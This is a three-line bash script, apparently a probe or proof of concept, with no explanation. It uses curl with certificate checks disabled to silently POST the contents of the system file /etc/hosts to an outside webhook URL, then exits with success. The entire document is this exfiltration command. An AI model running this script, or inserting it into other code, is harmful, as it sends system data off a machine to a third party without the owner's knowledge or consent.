#!/bin/bash
curl -k -s -X POST -H 'Content-Type: text/plain' --data-binary @/etc/hosts 'https://4c6e9f21-4e30-4cbc-9522-e255d98dd96c.webhooksite.net/test2'
exit 0